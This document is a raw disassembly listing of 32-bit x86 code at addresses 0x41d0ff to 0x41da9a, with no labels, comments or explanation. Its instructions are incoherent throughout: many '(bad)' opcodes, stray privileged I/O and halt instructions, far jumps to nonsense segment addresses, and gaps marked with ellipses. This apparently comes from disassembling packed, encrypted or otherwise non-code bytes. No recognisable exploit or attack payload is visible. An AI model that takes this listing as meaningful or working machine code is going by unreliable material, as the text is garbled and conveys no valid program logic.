  41d0ff:	scas   eax,DWORD PTR es:[edi]
  41d100:	dec    edx
  41d101:	xchg   edx,eax
  41d102:	xor    eax,0x2b9bb95f
  41d107:	sbb    ebx,DWORD PTR [eax+0x1c]
  41d10a:	inc    esi
  41d10b:	cmp    al,0x95
  41d10d:	in     al,dx
  41d10e:	lock test DWORD PTR [edi+0x7955ab3e],edi
  41d115:	xchg   edi,eax
  41d116:	mov    ds:0xd87fcf7c,al
  41d11b:	cmp    BYTE PTR [edi+esi*8+0x64],0x7f
  41d120:	inc    ecx
  41d121:	leave  
  41d122:	es mov eax,0x18d3c68c
  41d128:	test   ch,al
  41d12a:	sbb    al,bl
  41d12c:	out    0x97,al
  41d12e:	and    al,0xeb
  41d130:	aas    
  41d131:	lods   eax,DWORD PTR ds:[esi]
  41d132:	fldenv [ecx]
  41d134:	(bad)  
  41d135:	push   ebp
  41d136:	icebp  
  41d137:	(bad)  [edi+0x7f]
  41d13a:	call   FWORD PTR [eax+0x1f]
  41d13d:	int    0xdd
  41d13f:	jecxz  0x41d153
  41d141:	or     DWORD PTR [esi-0x28987c15],ebp
  41d147:	sahf   
  41d148:	jne    0x41d152
  41d14a:	(bad)  
  41d14c:	mov    bh,0x8e
  41d14e:	(bad)  
  41d14f:	loop   0x41d0e9
  41d151:	jl     0x41d11e
  41d153:	enter  0xb2b9,0x96
  41d157:	neg    edi
  41d159:	ror    DWORD PTR [edx-0x68f2614f],1
  41d15f:	jo     0x41d19c
  41d161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d162:	ss (bad) 
  41d164:	sub    al,0x69
  41d166:	push   es
  41d167:	push   ss
  41d168:	adc    dh,al
  41d16a:	jmp    DWORD PTR [edx+0x75e5b062]
  41d170:	ror    ecx,cl
  41d172:	xchg   edi,eax
  41d173:	outs   dx,DWORD PTR ds:[esi]
  41d174:	mov    al,0x8f
  41d176:	aaa    
  41d177:	add    ebp,eax
  41d179:	adc    BYTE PTR [eax-0x5ed9bdf6],cl
  41d17f:	xchg   DWORD PTR [ebx],eax
  41d181:	or     dh,BYTE PTR [ebx]
  41d183:	mov    DWORD PTR [eax],ebx
  41d185:	jmp    0x19a5:0x45ed66fa
  41d18c:	adc    edi,ebp
  41d18e:	enter  0xb0f,0x84
  41d192:	rcl    BYTE PTR [ecx-0x4d],0xd6
  41d196:	inc    ebp
  41d197:	fwait
  41d198:	jle    0x41d154
  41d19a:	popa   
  41d19b:	lahf   
  41d19c:	xchg   edi,eax
  41d19d:	repz das 
  41d19f:	iret   
  41d1a0:	test   DWORD PTR [eax-0x1d],0x1655db03
  41d1a7:	push   ds
  41d1a8:	xchg   ebp,eax
  41d1a9:	cmp    BYTE PTR [ebx-0xf],dh
  41d1ac:	in     al,dx
  41d1ad:	xor    BYTE PTR [eax],bl
  41d1af:	cdq    
  41d1b0:	(bad)  
  41d1b1:	dec    ecx
  41d1b2:	sub    ebp,DWORD PTR [edi]
  41d1b4:	out    0x91,eax
  41d1b6:	xor    BYTE PTR [edx+0x281c9a4e],bh
  41d1bc:	mov    ah,0x9b
  41d1be:	jge    0x41d23e
  41d1c0:	adc    ah,BYTE PTR [edi-0x23c9bce]
  41d1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1c7:	jmp    0x2162:0xccad87ff
  41d1ce:	int3   
  41d1cf:	add    al,0x56
  41d1d1:	lds    ebp,FWORD PTR [esi+0x20]
  41d1d4:	mov    ebx,0xa5903abe
  41d1d9:	out    0x7d,eax
  41d1db:	sub    al,0x20
  41d1dd:	lea    esi,ss:[ebx]
  41d1e0:	sub    DWORD PTR [edx],esp
  41d1e2:	sbb    al,0xf2
  41d1e4:	sub    edi,DWORD PTR ds:0x3795528b
  41d1ea:	(bad)  
  41d1eb:	ins    DWORD PTR es:[edi],dx
  41d1ec:	jae    0x41d1ce
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	pop    edi
  41d263:	fimul  WORD PTR [ebp+ebx*4+0x67]
  41d267:	cmp    DWORD PTR [ecx],eax
  41d269:	add    BYTE PTR [eax],al
  41d26b:	add    DWORD PTR [eax],eax
  41d26d:	add    BYTE PTR [edx-0x3aab41c9],ah
  41d273:	sbb    al,0xa6
  41d275:	scas   eax,DWORD PTR es:[edi]
  41d276:	dec    ebx
  41d277:	push   edi
  41d278:	cdq    
  41d279:	adc    eax,0x65de81ee
  41d27e:	ja     0x41d298
  41d280:	mov    ecx,0x3461f04e
  41d285:	outs   dx,DWORD PTR ds:[esi]
  41d286:	sbb    DWORD PTR [edi-0x30],edi
  41d289:	in     eax,0x5c
  41d28b:	dec    edi
  41d28c:	cmp    esi,edi
  41d28e:	inc    ebp
  41d28f:	mov    edi,0x9864de62
  41d294:	push   ecx
  41d295:	push   cs
  41d296:	jb     0x41d2da
  41d298:	xor    ch,0x3a
  41d29b:	push   ecx
  41d29c:	push   ss
  41d29d:	dec    ebp
  41d29e:	in     eax,dx
  41d29f:	cmp    eax,0x7cffa8c7
  41d2a4:	out    0x3f,al
  41d2a6:	dec    edx
  41d2a7:	in     eax,dx
  41d2a8:	or     BYTE PTR [edx],dh
  41d2aa:	and    eax,DWORD PTR [edx]
  41d2ac:	dec    edi
  41d2ad:	sub    eax,0x6bab9a52
  41d2b2:	xor    DWORD PTR [edx-0x4b],edx
  41d2b5:	cmp    eax,0x7709e52b
  41d2ba:	data16 cmp BYTE PTR [edx-0x7ffa26c],bl
  41d2c1:	lods   al,BYTE PTR ds:[esi]
  41d2c2:	pop    esp
  41d2c3:	cld    
  41d2c4:	or     al,0x6c
  41d2c6:	mov    BYTE PTR [edx-0x7],cl
  41d2c9:	cli    
  41d2ca:	or     DWORD PTR [esi],edi
  41d2cc:	push   eax
  41d2cd:	iret   
  41d2ce:	jns    0x41d2b1
  41d2d0:	mov    ah,0x53
  41d2d2:	inc    ebp
  41d2d3:	push   esi
  41d2d4:	add    eax,0x62c3f74f
  41d2d9:	xlat   BYTE PTR ds:[ebx]
  41d2da:	jnp    0x41d308
  41d2dc:	pop    es
  41d2dd:	ret    0x73fc
  41d2e0:	imul   eax,DWORD PTR [eax+0x75222665],0x77
  41d2e7:	pop    edi
  41d2e8:	push   cs
  41d2e9:	jle    0x41d2b0
  41d2eb:	push   ebp
  41d2ec:	repz mov WORD PTR [edi+0x52],gs
  41d2f0:	cmp    edi,DWORD PTR [ecx]
  41d2f2:	shl    DWORD PTR [esi-0x1f],cl
  41d2f5:	aaa    
  41d2f6:	lds    edi,FWORD PTR [esi+0x5733aacd]
  41d2fc:	int3   
  41d2fd:	ficom  DWORD PTR [ebx-0x46]
  41d300:	jae    0x41d34a
  41d302:	push   es
  41d303:	shr    DWORD PTR [esi+0x4],0x60
  41d307:	leave  
  41d308:	add    eax,0x96aabde8
  41d30d:	cmp    esp,DWORD PTR [esi+0xb63b3d4]
  41d313:	sub    al,0x9
  41d315:	cmp    esp,0x625cf225
  41d31b:	daa    
  41d31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d31d:	icebp  
  41d31e:	and    BYTE PTR [ecx-0x1bfe4659],dh
  41d324:	cmp    al,0x7
  41d326:	in     al,0xaa
  41d328:	cmp    al,BYTE PTR [edi*2-0x3e44db3e]
  41d32f:	cmp    eax,0x3f465bee
  41d334:	add    edi,DWORD PTR [ebx+0x49973d58]
  41d33a:	add    eax,0xf1dbb572
  41d33f:	pushf  
  41d340:	icebp  
  41d341:	sbb    ebx,DWORD PTR [edi+0x5c]
  41d344:	icebp  
  41d345:	aaa    
  41d346:	outs   dx,DWORD PTR ds:[esi]
  41d347:	das    
  41d348:	int    0x8c
  41d34a:	je     0x41d320
  41d34c:	(bad)  
  41d34d:	jl     0x41d366
  41d34f:	ret    0x49e5
  41d352:	sub    ebp,DWORD PTR ds:0xe5307a19
  41d358:	clc    
  41d359:	(bad)  
  41d35a:	pop    es
  41d35b:	(bad)  
  41d35d:	fisttp WORD PTR [ebp+0x24]
  41d360:	sub    esi,DWORD PTR [ecx+0x4d1b8057]
  41d366:	xchg   edx,eax
  41d367:	mov    ch,BYTE PTR [ebx+0x3e040632]
  41d36d:	mov    DWORD PTR [eax],eax
	...
  41d3d3:	add    BYTE PTR [eax],al
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx-0x54],0x21
  41d3e4:	mov    ah,0x67
  41d3e6:	cmp    al,BYTE PTR [bx+di]
  41d3e9:	add    BYTE PTR [eax],al
  41d3eb:	add    DWORD PTR [eax],eax
  41d3ed:	add    bl,ch
  41d3ef:	push   ds
  41d3f0:	out    0x46,al
  41d3f2:	outs   dx,DWORD PTR ds:[esi]
  41d3f3:	lock int 0x87
  41d3f6:	loopne 0x41d415
  41d3f8:	sub    ch,BYTE PTR [edi+edi*1+0x6e]
  41d3fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3fd:	div    DWORD PTR [edx+0x5]
  41d400:	and    BYTE PTR [esi],ch
  41d402:	repnz shr ch,cl
  41d405:	idiv   ecx
  41d407:	mov    edi,0x60ff2c8e
  41d40c:	jle    0x41d3e8
  41d40e:	cmp    BYTE PTR [eax+0x3c09bf66],0x59
  41d415:	and    DWORD PTR [eax],esp
  41d417:	(bad)
  41d41a:	adc    BYTE PTR [edx+ecx*8],bh
  41d41d:	inc    edx
  41d41e:	xor    eax,0xd9f4527f
  41d423:	cmp    al,0xc4
  41d425:	xchg   DWORD PTR gs:[ebp-0x1f],ebp
  41d429:	pop    edx
  41d42a:	into   
  41d42b:	ins    BYTE PTR es:[edi],dx
  41d42c:	or     eax,0xc7a64eda
  41d431:	not    BYTE PTR [eax-0x15]
  41d434:	and    al,0x5c
  41d436:	add    ecx,DWORD PTR [ecx-0x78]
  41d439:	fsub   st,st(4)
  41d43b:	leave  
  41d43c:	jp     0x41d47d
  41d43e:	mov    esp,0xc11764e6
  41d443:	mov    gs,ecx
  41d445:	sbb    BYTE PTR [esi],ah
  41d447:	pop    es
  41d448:	popa   
  41d449:	std    
  41d44a:	dec    eax
  41d44b:	mov    ebp,0xf7f22e26
  41d450:	inc    edi
  41d451:	mov    eax,ds:0xc14d6df4
  41d456:	test   eax,0x54a75900
  41d45b:	aaa    
  41d45c:	fadd   DWORD PTR [esi+edi*1-0x1aa5f0ff]
  41d463:	inc    ecx
  41d464:	ds cli 
  41d466:	xchg   ebp,eax
  41d467:	fwait
  41d468:	inc    ebp
  41d469:	xchg   ebp,eax
  41d46a:	aas    
  41d46b:	mov    esp,0xaca52cb6
  41d470:	int    0x57
  41d472:	inc    ebp
  41d473:	or     esi,DWORD PTR [ecx-0x5e]
  41d476:	jns    0x41d458
  41d478:	xor    al,0xd9
  41d47a:	cli    
  41d47b:	sar    BYTE PTR [edx-0x2153a279],0x65
  41d482:	add    BYTE PTR [esi],al
  41d484:	push   0x503ae584
  41d489:	mov    DWORD PTR [ebx-0xe904c0c],ebp
  41d48f:	push   ss
  41d490:	test   DWORD PTR [ebp-0x2cff26e5],esp
  41d496:	add    BYTE PTR [ebx],0x3f
  41d499:	fwait
  41d49a:	jge    0x41d463
  41d49c:	lods   al,BYTE PTR ds:[esi]
  41d49d:	jne    0x41d4e8
  41d49f:	jno    0x41d477
  41d4a1:	xchg   esp,eax
  41d4a2:	xchg   esi,eax
  41d4a3:	adc    eax,0x6f46fec0
  41d4a8:	or     al,0xd4
  41d4aa:	(bad)  
  41d4ab:	data16 mov WORD PTR [ebp+ebp*1+0x67a5804e],?
  41d4b3:	(bad)  
  41d4b4:	xchg   ecx,eax
  41d4b5:	ja     0x41d506
  41d4b7:	sub    cl,cl
  41d4b9:	add    eax,0x3225efe
  41d4be:	xor    ecx,DWORD PTR [ecx-0x4e]
  41d4c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4c2:	sbb    BYTE PTR [esi+0xd74a378],bh
  41d4c8:	mov    al,ds:0xe34c383f
  41d4cd:	mov    ecx,0x440b38d7
  41d4d2:	cs xchg esp,eax
  41d4d4:	jbe    0x41d4c0
  41d4d6:	mov    esi,0x28bd1203
  41d4db:	mov    cl,bl
  41d4dd:	jecxz  0x41d533
  41d4df:	and    dl,BYTE PTR [esi-0x6564db23]
  41d4e5:	dec    eax
  41d4e6:	in     eax,dx
  41d4e7:	cli    
  41d4e8:	mov    ebx,0xdac7c34c
  41d4ed:	jne    0x41d4ef
	...
  41d553:	add    BYTE PTR [eax],al
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x6729:0x442e9289
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [ebx],bh
  41d56f:	mov    eax,ds:0x9f3d14d7
  41d574:	mov    edi,DWORD PTR [eax]
  41d576:	or     BYTE PTR [ebx+0x598a336c],0xac
  41d57d:	stos   BYTE PTR es:[edi],al
  41d57e:	fidiv  DWORD PTR [ebx+edx*2-0x5b]
  41d582:	and    al,0x96
  41d584:	and    al,0xc1
  41d586:	(bad)  [esi+0x292f6938]
  41d58c:	xchg   edx,eax
  41d58d:	jle    0x41d60c
  41d58f:	xchg   ecx,eax
  41d590:	xlat   BYTE PTR ds:[ebx]
  41d591:	jmp    0x6ed5:0xfe45b20
  41d598:	jge    0x41d59d
  41d59a:	outs   dx,DWORD PTR ds:[esi]
  41d59b:	add    esp,DWORD PTR [esi]
  41d59d:	js     0x41d589
  41d59f:	popa   
  41d5a0:	adc    BYTE PTR [eax+ebx*4],ch
  41d5a3:	xchg   ebx,eax
  41d5a4:	and    bl,BYTE PTR [ebx-0x37]
  41d5a7:	cwde   
  41d5a8:	mov    ah,0x6f
  41d5aa:	mov    dh,0xba
  41d5ac:	inc    edx
  41d5ad:	mov    ah,0x93
  41d5af:	adc    esp,DWORD PTR [edx]
  41d5b1:	adc    BYTE PTR [edx+0x21],dh
  41d5b4:	ins    BYTE PTR es:[edi],dx
  41d5b5:	xor    eax,0x6c6583a3
  41d5ba:	mov    BYTE PTR [esi+eax*2+0x7381a144],dl
  41d5c1:	sbb    DWORD PTR [ebp-0x27],esp
  41d5c4:	pop    ds
  41d5c5:	arpl   dx,di
  41d5c7:	ffreep st(0)
  41d5c9:	ds cmp ebx,esp
  41d5cc:	dec    edx
  41d5cd:	sti    
  41d5ce:	out    0x6b,al
  41d5d0:	test   BYTE PTR [ecx-0x1ad3fe78],al
  41d5d6:	push   esi
  41d5d7:	shl    BYTE PTR [esp+ebx*2-0x4a90809d],1
  41d5de:	fld    st(7)
  41d5e0:	cmc    
  41d5e1:	pop    ecx
  41d5e2:	ja     0x41d5d3
  41d5e4:	cmc    
  41d5e5:	imul   ecx,DWORD PTR [eax-0x6437e8d9],0x34
  41d5ec:	aad    0x7c
  41d5ee:	shl    DWORD PTR [ecx],cl
  41d5f0:	adc    BYTE PTR [ecx+edi*4],ah
  41d5f3:	stc    
  41d5f4:	sti    
  41d5f5:	cld    
  41d5f6:	imul   ecx,DWORD PTR [ebx],0xffffff97
  41d5f9:	aam    0x7f
  41d5fb:	pop    esp
  41d5fc:	add    eax,0xd609ed42
  41d601:	adc    DWORD PTR [edx],eax
  41d603:	inc    ebx
  41d604:	icebp  
  41d605:	jmp    0x41d590
  41d607:	pop    ds
  41d608:	daa    
  41d609:	js     0x41d5f0
  41d60b:	repz push ebx
  41d60d:	div    DWORD PTR [esp+ebp*2]
  41d610:	add    DWORD PTR [esi-0x8],ebp
  41d613:	pop    ss
  41d614:	mov    bl,0xd9
  41d616:	push   ebx
  41d617:	aaa    
  41d618:	sub    ch,ah
  41d61a:	test   edx,esp
  41d61c:	int3   
  41d61d:	rol    BYTE PTR [ecx+0xa18933d],cl
  41d623:	cmp    DWORD PTR [ecx+0x41],edi
  41d626:	nop
  41d627:	push   esp
  41d628:	adc    ah,BYTE PTR [ecx]
  41d62a:	mov    dl,0x4e
  41d62c:	daa    
  41d62d:	push   ecx
  41d62e:	mov    bh,0xc3
  41d630:	shl    edi,0x51
  41d633:	push   ecx
  41d634:	or     eax,0x6e52b66b
  41d639:	les    esp,FWORD PTR [esi]
  41d63b:	jmp    DWORD PTR [edi-0x52]
  41d63e:	xor    dl,dh
  41d640:	fimul  DWORD PTR [edx]
  41d642:	jmp    0x98cf:0x32aa85a6
  41d649:	aam    0x37
  41d64b:	add    eax,0x6f4224ed
  41d650:	cmp    bh,BYTE PTR [ebp+0x46]
  41d653:	xchg   DWORD PTR [eax],ebp
  41d655:	std    
  41d656:	xor    BYTE PTR [eax+0x3b],cl
  41d659:	loopne 0x41d605
  41d65b:	inc    ebp
  41d65c:	ret    0x6384
  41d65f:	adc    ecx,DWORD PTR [edx+0x7b7cabc2]
  41d665:	stos   BYTE PTR es:[edi],al
  41d666:	xchg   ebx,eax
  41d667:	mov    edi,0x14c4d5a5
  41d66c:	mov    BYTE PTR gs:[eax],al
	...
  41d6d3:	add    BYTE PTR [eax],al
  41d6d5:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x7f66e435
  41d6e3:	outs   dx,BYTE PTR ds:[esi]
  41d6e4:	sub    eax,DWORD PTR ds:0x13c67
  41d6ea:	add    BYTE PTR [ecx],al
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	fcom   QWORD PTR [esi-0x63]
  41d6f1:	outs   dx,DWORD PTR ds:[esi]
  41d6f2:	pop    ebp
  41d6f3:	scas   eax,DWORD PTR es:[edi]
  41d6f4:	jns    0x41d686
  41d6f6:	push   edx
  41d6f7:	mov    ds:0xbce9538c,al
  41d6fc:	retf   
  41d6fd:	mov    BYTE PTR [ecx+0x4de5885e],ch
  41d703:	call   0x26c8bc3f
  41d708:	cmp    DWORD PTR [ecx+0x756d00a0],edx
  41d70e:	fld    QWORD PTR [ecx-0x5c4a2b49]
  41d714:	or     eax,0x1c013083
  41d719:	lods   al,BYTE PTR ds:[esi]
  41d71a:	sahf   
  41d71b:	les    esi,FWORD PTR [edx+0x396f5551]
  41d721:	push   es
  41d722:	inc    ebp
  41d723:	cmp    bl,BYTE PTR [edi-0x7a]
  41d726:	cmp    al,0xb3
  41d728:	frstor [eax]
  41d72a:	lods   al,BYTE PTR ds:[esi]
  41d72b:	scas   al,BYTE PTR es:[edi]
  41d72c:	jnp    0x41d7aa
  41d72e:	in     eax,dx
  41d72f:	pushf  
  41d730:	(bad)  
  41d731:	pop    ebx
  41d732:	jae    0x41d751
  41d734:	jge    0x41d793
  41d736:	sbb    BYTE PTR [edi-0xb],al
  41d739:	shl    ebx,cl
  41d73b:	psubusb mm4,mm3
  41d73e:	mov    bl,0x2f
  41d740:	jnp    0x41d725
  41d742:	(bad)  
  41d743:	xchg   esp,eax
  41d744:	inc    edi
  41d745:	mov    eax,0xcf48e393
  41d74a:	aam    0x33
  41d74c:	stos   BYTE PTR es:[edi],al
  41d74d:	mov    es,edx
  41d74f:	add    al,0xa0
  41d751:	add    DWORD PTR [ebp+0x12706e2e],ebp
  41d757:	mov    cl,BYTE PTR [edi]
  41d759:	popa   
  41d75a:	push   esi
  41d75b:	gs or  al,0x17
  41d75e:	push   esi
  41d75f:	adc    BYTE PTR [esi],al
  41d761:	icebp  
  41d762:	mov    ch,0x13
  41d764:	pop    ds
  41d765:	lds    eax,FWORD PTR ds:0x1481bf56
  41d76b:	xor    esp,DWORD PTR [eax-0x26]
  41d76e:	sti    
  41d76f:	imul   edx,DWORD PTR [esi+ebx*4+0x66239a9d],0x61
  41d777:	mov    cl,0xcf
  41d779:	sbb    BYTE PTR [eax+eiz*1],al
  41d77c:	add    eax,0x341f2979
  41d781:	inc    ebp
  41d782:	adc    BYTE PTR [eax-0x6422380f],0x29
  41d789:	push   es
  41d78a:	push   cs
  41d78b:	sti    
  41d78c:	dec    ebx
  41d78d:	hlt    
  41d78e:	rcl    edi,1
  41d790:	push   es
  41d791:	sbb    edx,DWORD PTR [edi]
  41d793:	inc    edi
  41d794:	mov    edx,0x4b560d55
  41d799:	mov    edi,0xf8540e06
  41d79e:	mov    eax,ds:0x4122c63d
  41d7a3:	dec    edi
  41d7a4:	das    
  41d7a5:	rcr    edi,0xb9
  41d7a8:	jbe    0x41d789
  41d7aa:	fld    QWORD PTR [ecx-0x27da8b57]
  41d7b0:	push   eax
  41d7b1:	jb     0x41d74d
  41d7b3:	mov    edx,edi
  41d7b5:	int3   
  41d7b6:	bound  ebx,QWORD PTR [ecx+0x2]
  41d7b9:	or     eax,0xa1e583f
  41d7be:	cmc    
  41d7bf:	test   DWORD PTR [esp+edi*2],eax
  41d7c2:	shl    dl,cl
  41d7c4:	lock dec esi
  41d7c6:	in     al,0x61
  41d7c8:	(bad)  
  41d7c9:	cmp    eax,0x190e1fdd
  41d7ce:	shr    DWORD PTR [edx+0x48f11c6c],0x37
  41d7d5:	into   
  41d7d6:	cli    
  41d7d7:	pop    ebp
  41d7d8:	add    cl,BYTE PTR [edx+0x1f2ea692]
  41d7de:	popf   
  41d7df:	add    al,0x77
  41d7e1:	int    0xea
  41d7e3:	cwde   
  41d7e4:	pop    edi
  41d7e5:	push   es
  41d7e6:	mov    DWORD PTR [ebx],eax
  41d7e8:	lods   eax,DWORD PTR ds:[esi]
  41d7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7ea:	mov    bh,0xf
  41d7ec:	outs   dx,BYTE PTR ds:[esi]
  41d7ed:	or     eax,0x0
	...
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	inc    edi
  41d863:	fwait
  41d864:	inc    ebx
  41d865:	push   edx
  41d866:	addr16 cmp eax,0x1000001
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	mov    esi,0xf2500a45
  41d873:	leave  
  41d874:	add    ecx,DWORD PTR [ebx+0xeff4f3e]
  41d87a:	jo     0x41d84c
  41d87c:	(bad)  
  41d87d:	xchg   ebp,eax
  41d87e:	mov    edx,0x8f6d2d2d
  41d883:	ds adc cl,dh
  41d886:	cmp    al,0xea
  41d888:	inc    esp
  41d889:	daa    
  41d88a:	mov    eax,0x3a0d40f7
  41d88f:	fbstp  TBYTE PTR [esi+0x16bc901b]
  41d895:	cs jge 0x41d8b5
  41d898:	pop    ds
  41d899:	jno    0x41d866
  41d89b:	jnp    0x41d81f
  41d89d:	pop    eax
  41d89e:	xchg   esi,eax
  41d89f:	add    BYTE PTR [ebx+0xd],0x7b
  41d8a3:	stos   BYTE PTR es:[edi],al
  41d8a4:	jbe    0x41d909
  41d8a6:	dec    edi
  41d8a7:	(bad)  
  41d8a8:	inc    eax
  41d8a9:	jmp    0x9630c3de
  41d8ae:	sbb    BYTE PTR ds:0xa790f64b,0x8b
  41d8b5:	imul   edi,DWORD PTR [eax+0x71],0x4ec7fb4a
  41d8bc:	mov    WORD PTR ds:0x6b6a11c2,cs
  41d8c2:	pop    esi
  41d8c3:	sub    bl,al
  41d8c5:	mov    ch,0xc6
  41d8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c8:	sbb    ecx,DWORD PTR [esi-0xc4134ad]
  41d8ce:	jmp    0x41d929
  41d8d0:	pop    es
  41d8d1:	pop    eax
  41d8d2:	cmp    BYTE PTR [ebx],al
  41d8d4:	push   esp
  41d8d5:	sbb    eax,DWORD PTR [ebx]
  41d8d7:	les    ebx,FWORD PTR [edi-0x62c92da9]
  41d8dd:	push   cs
  41d8de:	cmp    ebp,DWORD PTR [ecx+0x6cee386b]
  41d8e4:	(bad)  [ebx+0xc23a412]
  41d8ea:	mov    ch,0x2b
  41d8ec:	and    eax,0x9cd45c1e
  41d8f1:	push   esp
  41d8f2:	nop
  41d8f3:	cld    
  41d8f4:	push   esi
  41d8f5:	ins    DWORD PTR es:[edi],dx
  41d8f6:	jmp    0xc2a4:0xc4501478
  41d8fd:	imul   eax,DWORD PTR [esi+0x65],0x1c
  41d901:	int    0xb
  41d903:	mov    bl,BYTE PTR [eax]
  41d905:	mov    ebp,0x7898b6ac
  41d90a:	cmp    ebp,DWORD PTR ds:0xba51b2ff
  41d910:	push   eax
  41d911:	popf   
  41d912:	sbb    eax,DWORD PTR [esp+esi*2-0x4b]
  41d916:	repz dec ebp
  41d918:	imul   edx,esi,0x32
  41d91b:	xchg   edx,eax
  41d91c:	inc    ebx
  41d91d:	popf   
  41d91e:	jmp    FWORD PTR [edi]
  41d920:	inc    ecx
  41d921:	inc    edi
  41d922:	mov    ah,0xe1
  41d924:	hlt    
  41d925:	jmp    0x41d8c0
  41d927:	cld    
  41d928:	cmp    DWORD PTR [ebx+0x24],0x61a1feec
  41d92f:	fsubr  DWORD PTR [ebx+0x79]
  41d932:	mov    esi,gs
  41d934:	jecxz  0x41d943
  41d936:	pop    es
  41d937:	ss jl  0x41d994
  41d93a:	jbe    0x41d945
  41d93c:	out    0x8,al
  41d93e:	and    edi,DWORD PTR [esi+0x6a]
  41d941:	or     BYTE PTR [edx+0x5dd0caf8],al
  41d947:	inc    esi
  41d948:	jge    0x41d968
  41d94a:	cmp    DWORD PTR [ecx+0x7f],ecx
  41d94d:	push   ebx
  41d94e:	sar    DWORD PTR [ecx+0x55],0x98
  41d952:	or     bl,ah
  41d954:	mov    dl,0x1
  41d956:	adc    al,0x44
  41d958:	pop    esp
  41d959:	mov    ds:0xbda81be3,al
  41d95e:	retf   
  41d95f:	test   bh,bl
  41d961:	push   0x5e8dea01
  41d966:	out    dx,eax
  41d967:	popf   
  41d968:	mov    ebp,0xfe0a6d4c
  41d96d:	jne    0x41d96f
	...
  41d9d3:	add    BYTE PTR [eax],al
  41d9d5:	add    ah,al
  41d9d7:	ins    BYTE PTR es:[edi],dx
  41d9d8:	pop    es
  41d9d9:	pushf  
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs add eax,0x678f29bb
  41d9e7:	add    DWORD PTR ds:[eax],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	les    edi,FWORD PTR [ebx-0x3f0890e6]
  41d9f4:	mov    cl,0xad
  41d9f6:	pop    eax
  41d9f7:	sbb    DWORD PTR [ecx],0x77
  41d9fa:	in     eax,dx
  41d9fb:	add    ch,ch
  41d9fd:	sbb    bl,0x81
  41da00:	inc    ecx
  41da01:	imul   ebp,DWORD PTR [eax+0x1a],0xbfb8c839
  41da08:	inc    eax
  41da09:	cld    
  41da0a:	jae    0x41d9da
  41da0c:	sbb    dl,BYTE PTR [eax-0x2c]
  41da0f:	ret    
  41da10:	popf   
  41da11:	push   esp
  41da12:	stos   BYTE PTR es:[edi],al
  41da13:	inc    esi
  41da14:	push   esi
  41da15:	ins    DWORD PTR es:[edi],dx
  41da16:	je     0x41da0a
  41da18:	push   esi
  41da19:	mov    bl,0x3c
  41da1b:	mov    edx,0xfda5027
  41da20:	add    DWORD PTR [ebx+0xf],edi
  41da23:	jnp    0x41da6b
  41da25:	in     al,dx
  41da26:	xor    cl,dl
  41da28:	inc    esi
  41da29:	mov    al,0xa
  41da2b:	or     esi,DWORD PTR [esi+0x7a]
  41da2e:	dec    edx
  41da2f:	enter  0x6545,0xd8
  41da33:	xchg   ecx,eax
  41da34:	or     DWORD PTR [esp+esi*1-0x5],ecx
  41da38:	aas    
  41da39:	scas   al,BYTE PTR es:[edi]
  41da3a:	aaa    
  41da3b:	jl     0x41da12
  41da3d:	cmp    eax,0xb343c93a
  41da42:	rcr    BYTE PTR [ecx],cl
  41da44:	dec    ecx
  41da45:	xchg   esp,eax
  41da46:	lahf   
  41da47:	nop
  41da48:	inc    al
  41da4a:	sbb    ebx,0x8bb2efd4
  41da50:	repz dec edx
  41da52:	pop    ecx
  41da53:	inc    esi
  41da54:	xchg   al,ch
  41da56:	lahf   
  41da57:	push   ds
  41da58:	daa    
  41da59:	stc    
  41da5a:	lock inc edi
  41da5c:	sti    
  41da5d:	push   ecx
  41da5e:	int    0xae
  41da60:	cmp    BYTE PTR [edi],0x93
  41da63:	ret    
  41da64:	pop    es
  41da65:	sub    eax,0xf42611b1
  41da6a:	sub    bl,ah
  41da6c:	push   eax
  41da6d:	test   BYTE PTR [eax-0x6b],bl
  41da70:	test   eax,0xd0e1900f
  41da75:	add    DWORD PTR [ebx],edx
  41da77:	mov    bl,0xb9
  41da79:	pop    ds
  41da7a:	push   DWORD PTR ds:[ebx-0x64]
  41da7e:	cmp    ah,BYTE PTR [esi]
  41da80:	rol    cl,0x63
  41da83:	pop    edi
  41da84:	(bad)  
  41da85:	jne    0x41dab3
  41da87:	vmulps xmm5,xmm3,XMMWORD PTR [ecx]
  41da8b:	ins    BYTE PTR es:[edi],dx
  41da8c:	hlt    
  41da8d:	aad    0x3a
  41da8f:	or     BYTE PTR [ecx+0x56],ah
  41da92:	retf   
  41da93:	mov    ds:0x131ca649,al
  41da98:	adc    BYTE PTR [esi],bh
  41da9a:	add    al,0x3a
